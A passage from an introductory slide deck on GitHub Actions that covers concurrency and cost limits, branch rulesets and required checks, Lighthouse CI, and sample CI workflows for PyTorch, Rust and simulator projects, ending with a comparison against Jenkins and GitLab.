Jenkins jobs on this GitHub installed a sister simulator with `pip install "pkg @ git+https://…"` into a reused virtualenv. pip saw the package already installed and kept the old commit, so builds tested stale code and failed (SimEng 07 notes). Fixed with `--force-reinstall`.

**On Actions:** hosted runners start clean, so the trap returns only if you *cache* a virtualenv (or `site-packages`) keyed on a lock file that doesn't name the git commit, or use a persistent self-hosted runner. Key on the resolved commit, or don't cache environments.

---

## Slide 18 — Cost, Limits and Speed

```yaml
on:
  workflow_dispatch:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  slow:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - run: sleep 90 && echo "finished (not cancelled)"
```

![The first concurrency demo run, Cancelled: Canceling since a higher priority waiting request for Demo: concurrency group-refs/heads/main exists](images/concurrency_cancelled.png)

Dispatched twice, 22 s apart: [run 37214446270](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214446270) was cancelled, [run 37214470039](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214470039) finished.

**Speed and spend**

- **Concurrency group**: runs sharing a group name don't overlap; `cancel-in-progress: true` cancels the older one. Use the branch in the name so a new push cancels its own stale run, not other branches'
- `timeout-minutes`: a hung job otherwise runs for the 6-hour limit
- **Path filters** (`paths`, `paths-ignore`) skip workflows that a change can't affect. Never on a required check: a skipped workflow never reports, and the PR waits for ever (slide 20)
- Caches; fewer matrix legs on PRs, all of them nightly

| Limit (October 2026) | Value |
|----------------------|-------|
| Public repos, standard hosted runners | free |
| Private repos, included minutes / month | Free 2,000 · Pro 3,000 · Team 3,000; then billed per minute |
| Concurrent jobs, standard runners | Free 20 · Pro 40 · Team 60 |
| Job run time, hosted runner | 6 hours |
| Workflow run time (incl. waiting) | 35 days |
| Matrix size | 256 jobs per run |

These change: check [Actions limits](https://docs.github.com/en/actions/reference/limits) and [billing and usage](https://docs.github.com/en/actions/concepts/billing-and-usage) before planning around them. Minutes on Windows and macOS runners cost more than Linux.

---

## Slide 19 — Protecting main: Branch Protection and Rulesets

- **Protected branch**: a branch GitHub guards with rules, so nobody can break it by accident
- **Branch protection rule**: the older mechanism; one rule per branch pattern, visible only to admins
- **Ruleset**: the newer one. Several can apply to a branch at once, they can be switched off without deleting, and anyone with read access can see them
- **Required status check**: a named check that must pass before a PR can merge
- **Require branches to be up to date** (strict): the PR must also contain the latest `main`, so checks ran on what will be merged. Safer; costs a rebase and a re-run whenever `main` moves
- **Required reviews**: N approvals from people with write access
- **Block force pushes / deletions**: history on `main` can't be rewritten, and the branch can't be deleted
- **Bypass list** (rulesets) or **include administrators** (branch protection): who may ignore the rules. An empty bypass list means the owner is blocked too

![This repository's ruleset Protect main, viewed logged out](images/ruleset.png)

This repo's ruleset, viewed logged out: `Protect main`, active on the default branch.

[About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets) · [About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)

---

## Slide 20 — Required Checks, Shown Blocking

| Setting on `Protect main` | Value |
|---------------------------|-------|
| Target | default branch (`main`) |
| Require a pull request | yes, 0 approvals (a single-owner repo can't approve its own PRs) |
| Required status checks | `Demo gate`, from the GitHub Actions app |
| Require up to date (strict) | off |
| Block force pushes; restrict deletions | on |
| Bypass list | empty: no one, admins included |

Read back with `gh api repos/OWNER/REPO/rulesets/24459524`.

### A direct push to `main`

```text
remote: error: GH013: Repository rule violations found for refs/heads/main.
remote: - Changes must be made through a pull request.
remote: - Required status check "Demo gate" is expected.
 ! [remote rejected] HEAD -> main (push declined due to repository rule violations)
```

### PR #1: the check fails

A deliberately wrong test: `Demo gate` red ([run 37214705396](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396)); merge state `BLOCKED`.

```text
$ gh pr merge 1 --squash
X Pull request #1 is not mergeable: the base branch policy prohibits the merge.
```

### PR #3: every check green, still blocked

The only change renames the job to `Demo gate (renamed)`. Its check passed ([run 37215299081](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37215299081)) but is `isRequired: false`; the required `Demo gate` never reports, so the PR stays `BLOCKED`.

**Required checks match the check's name**, which comes from the job's `name:` (or its ID), plus the matrix values for a matrix leg: `test (3.10)`. Rename a job, or change a matrix, and update the ruleset in the same change.

PR #2 passed `Demo gate` and was squash-merged ([run 37214851553](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214851553)). Every change since then, including this deck, went in the same way.

---

## Slide 21 — Quality Gates Beyond Tests: Lighthouse CI

```yaml
lighthouse:
  name: Lighthouse
  runs-on: ubuntu-latest
  needs: [lint-and-typecheck, unit-tests]
  services:
    postgres:
      image: postgres:16
      env:
        POSTGRES_USER: test
        POSTGRES_PASSWORD: test
        POSTGRES_DB: transformer_explainer_test
      ports:
        - 5432:5432
      options: >-
        --health-cmd pg_isready
        --health-interval 10s
        --health-timeout 5s
        --health-retries 5
  # Production-like: no E2E credentials provider, real `pnpm build`.
  env:
    DATABASE_URL: postgres://test:test@localhost:5432/transformer_explainer_test
    AUTH_SECRET: test-secret-do-not-use-in-production-test-secret
    AUTH_GITHUB_ID: test
    AUTH_GITHUB_SECRET: test
    NEXT_PUBLIC_SITE_URL: http://localhost:3000
    ADMIN_GITHUB_LOGINS: testadmin
    AUTH_TRUST_HOST: "true"
  steps:
    - uses: actions/checkout@v4

    # pnpm version comes from `packageManager` in package.json.
    - uses: pnpm/action-setup@v4

    - uses: actions/setup-node@v4
      with:
        node-version: 20
        cache: pnpm

    - run: pnpm install --frozen-lockfile
    - run: pnpm db:migrate
    - run: pnpm build
    # Starts `pnpm start`, audits `/`, `/learn` and `/learn/03-attention`
    # three times each, and fails on any category below 0.9.
    - run: pnpm lighthouse

    - name: Upload Lighthouse reports
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: lighthouse-reports
        path: .lighthouseci/
        include-hidden-files: true
        retention-days: 7
```

`transformer-explainer/.github/workflows/ci.yml` at [d13988f](https://github.com/BrendanJamesLynskey/transformer-explainer/blob/d13988f/.github/workflows/ci.yml#L139-L191), lines 139–191. Green at that commit: [run 37214019146](https://github.com/BrendanJamesLynskey/transformer-explainer/actions/runs/37214019146).

- **Lighthouse**: Google's page auditor. It loads a page in Chrome and scores 0–100 for **performance** (load speed), **accessibility**, **best practices** (security and modern-web hygiene) and **SEO** (search-engine basics)
- **Lighthouse CI (LHCI)**: a CLI (`lhci autorun`) that starts the site, audits each URL several times and fails if a score drops below a **budget**

```json
"assert": {
  "assertions": {
    "categories:performance": ["error", { "minScore": 0.9 }],
    "categories:accessibility": ["error", { "minScore": 0.9 }],
    "categories:best-practices": ["error", { "minScore": 0.9 }]
  }
},
```

`lighthouserc.json`: three runs each of `/`, `/learn` and `/learn/03-attention`; any of the three categories below 0.9 fails the job.

**After deploying**, a **smoke check** asks the live site whether it is healthy: `pnpm smoke https://…` (`scripts/smoke-check.ts`) fetches `/api/health` (200 only if the database is up and its schema is current) and every public page, and exits 1 on any failure. It is run by hand after each deploy (the project's RUNBOOK), not by this workflow.

Lighthouse job in the required checks on that repo's `main`, with Lint & Typecheck, Unit Tests, Verify maths and E2E Tests. Docs: [GoogleChrome/lighthouse-ci](https://github.com/GoogleChrome/lighthouse-ci).

---

## Slide 22 — Real Workflows: a PyTorch Matrix and a Rust Kernel

### Torch_Sim_Frontend (matrix)

```yaml
jobs:
  test:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        python: ["3.10", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - name: Install (CPU-only PyTorch)
        run: |
          pip install torch --index-url https://download.pytorch.org/whl/cpu
          pip install -e ".[test]" ruff
      - name: Lint
        run: ruff check src tests ci examples
      - name: Tests (rules, four front ends agreeing, closed forms, PyTorch's FLOP counter, cost models)
        run: pytest -p no:logging --cov=simfront
      - name: Arithmetic and drift gate
        run: python ci/perf_gate.py --margin 3.0
      - name: CLI smoke test (Llama-3-70B on the meta device)
        run: simfront --model llama3-70b --tokens 1024 --offload optical --top 5
```

[ci.yml at f78345d](https://github.com/BrendanJamesLynskey/Torch_Sim_Frontend/blob/f78345d/.github/workflows/ci.yml); green: [run 37148753853](https://github.com/BrendanJamesLynskey/Torch_Sim_Frontend/actions/runs/37148753853) (checks `test (3.10)`, `test (3.12)`). The CPU-only index keeps the PyTorch download small: no CUDA libraries on a runner with no GPU.

### Rust_DES_Kernel (two jobs)

```yaml
jobs:
  rust:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: rustfmt, clippy
      - uses: Swatinem/rust-cache@v2
      - name: Format
        run: cargo fmt --check
      - name: Clippy (library, tests, benches)
        run: cargo clippy --all-targets -- -D warnings
      - name: Tests (unit, golden parity, proptest, kernel)
        run: cargo test --release
      - name: CLI smoke test
        run: cargo run --release --bin disagg-rs -- --n 200 --json > /dev/null

  python:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy
      - uses: Swatinem/rust-cache@v2
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Clippy (PyO3 bindings)
        run: cargo clippy --features python -- -D warnings
      - name: Build the extension and install the Python reference simulator
        run: |
          python -m venv .venv
          .venv/bin/pip install maturin
          .venv/bin/maturin develop --release -E dev
      - name: Differential tests against Disaggregated_Inference_Sim
        run: .venv/bin/pytest pytests
```

[ci.yml at 91fcfc3](https://github.com/BrendanJamesLynskey/Rust_DES_Kernel/blob/91fcfc3/.github/workflows/ci.yml); green: [run 37206993167](https://github.com/BrendanJamesLynskey/Rust_DES_Kernel/actions/runs/37206993167). `Swatinem/rust-cache` caches `target/` and the cargo registry. `maturin develop` builds the PyO3 extension into a venv, then pytest checks it against the Python simulator. Both workflows on this slide pin actions by tag (`@v4`), not SHA: a follow-up for Dependabot.

---

## Slide 23 — Real Workflows: Cross-Repository Integration

### FHE_Accelerator_Sim (headline gate)

```yaml
jobs:
  test:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        python: ["3.10", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - uses: actions/setup-node@v4
        with:
          node-version: "22"
      - name: Install (with Memory_System_Sim for the optional HBM model)
        run: |
          pip install -e ".[dev]"
          pip install "memsim @ git+https://github.com/BrendanJamesLynskey/Memory_System_Sim"
      - name: Tests (scheme counts, simulator, properties, OpenFHE and HEIR front ends, memory model, JavaScript port bit-exact with Python)
        run: pytest -rs
      - name: Headline result unchanged (ARK-class baseline, results.md §4)
        run: |
          fhe-sim --params ark --hw ark --json | python -c "
          import json, sys
          d = json.load(sys.stdin)
          print(d['per_bootstrap_s'], d['bound'])
          assert round(d['per_bootstrap_s'] * 1e3, 2) == 13.94 and d['bound'] == 'memory-bound'
          "
```

[ci.yml at 6288e2b](https://github.com/BrendanJamesLynskey/FHE_Accelerator_Sim/blob/6288e2b/.github/workflows/ci.yml); green: [run 37153719825](https://github.com/BrendanJamesLynskey/FHE_Accelerator_Sim/actions/runs/37153719825). Node is installed so the JavaScript-port parity tests run (slide 17), `-rs` lists any skips, a sibling repo is installed from git, and the last step fails the build if the published 13.94 ms result moves.

### Memory_System_Sim (second job)

```yaml
fhe-integration:
  runs-on: ubuntu-24.04
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-python@v5
      with:
        python-version: "3.12"
    - name: Install with FHE_Accelerator_Sim
      run: pip install -e ".[test,fhe]"
    - name: FHE simulator with this HBM model
      run: |
        python -c "
        from fhe_sim import ACCELERATORS, PARAMS, bootstrap_trace, simulate, summarise
        from memsim.fhe import HBMChunkModel
        hw = ACCELERATORS['ark']
        a = summarise(simulate(bootstrap_trace(PARAMS['ark']), hw))
        b = summarise(simulate(bootstrap_trace(PARAMS['ark']), hw.with_(memory=HBMChunkModel())))
        print(a['per_bootstrap_s'], a['bound'], b['per_bootstrap_s'], b['bound'])
        assert b['per_bootstrap_s'] > a['per_bootstrap_s']
        "
```

[ci.yml at d3b77d9](https://github.com/BrendanJamesLynskey/Memory_System_Sim/blob/d3b77d9/.github/workflows/ci.yml); green: [run 37148749389](https://github.com/BrendanJamesLynskey/Memory_System_Sim/actions/runs/37148749389) (`test (3.10)`, `test (3.12)`, `fhe-integration`). The second job installs the FHE simulator and checks the two models still fit together: the HBM model must make bootstrapping slower than the ideal memory.

Each repo tests the other, so a change to one should re-run the other's workflow too: `gh workflow run ci.yml -R OWNER/OTHER`, or a `repository_dispatch` event sent from the first repo's CI.

---

## Slide 24 — Actions vs Jenkins vs GitLab CI

The full side-by-side table (hosting, config, extensibility, maintenance, cost, control) is on the [Introduction to Jenkins comparison slide](https://brendanjameslynskey.github.io/Introduction_to_Jenkins/#/18), with [when each one fits](https://brendanjameslynskey.github.io/Introduction_to_Jenkins/#/19). This slide adds only the Actions view.

### What Actions does best

- Lives in the repo: workflows are reviewed in PRs, run on PRs, and report as checks rulesets can require
- Nothing to host or patch on hosted runners; free for public repos
- The Marketplace: thousands of ready-made actions (pin them)
- GitHub-native events: issues, releases, comments, Dependabot, `workflow_dispatch` buttons
- OIDC to the main clouds, environments with approvals

### Where it is weaker

- GitHub only; another forge means another CI
- Hosted runners are generic VMs: no FPGA boards, licensed EDA tools or private lab networks without self-hosted runners, which you then maintain
- Debugging needs a push and a wait; `act` only approximates
- Long, stateful or hardware-bound regressions fit Jenkins better ([SimEng 07](https://brendanjameslynskey.github.io/SimEng_07_Jenkins_for_Simulation_Teams/))
- GitLab bundles registry, environments and security scanning in one product, and organises `.gitlab-ci.yml` jobs into stages by default

A common mix on this GitHub: Actions for every push and PR (fast, required checks), Jenkins for the simulator and RTL regressions that need local tools.

---

## Slide 25 — Takeaways and Next Steps

### What we covered

- An event starts a workflow; jobs run on fresh runners; steps `run` scripts or `uses` actions
- Matrices for combinations; `needs` and outputs to chain jobs; services for databases
- Cache by content hash; artifacts for files; summaries and annotations for people
- Composite actions share steps; reusable workflows share jobs
- `permissions: {}` then grant per job; secrets in environments; OIDC, not cloud keys
- Pin actions by SHA and let Dependabot bump them; untrusted text goes through `env`
- Debug with `--debug` re-runs and `actionlint`; make skipped tests loud
- Concurrency groups, timeouts, path filters (not on required checks)
- Rulesets make `main` need passing, correctly named checks

### Next

- [Introduction to CI/CD](https://brendanjameslynskey.github.io/Introduction_to_CI_CD/): the practice behind all of this
- [Introduction to Jenkins](https://brendanjameslynskey.github.io/Introduction_to_Jenkins/): the self-hosted alternative
- [SimEng 07: Jenkins for Simulation Teams](https://brendanjameslynskey.github.io/SimEng_07_Jenkins_for_Simulation_Teams/): CI for simulators and RTL
- [Interview_CI_CD](https://github.com/BrendanJamesLynskey/Interview_CI_CD): questions to test yourself

### Further reading

- [GitHub Actions documentation](https://docs.github.com/en/actions)
- [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [actionlint](https://github.com/rhysd/actionlint)
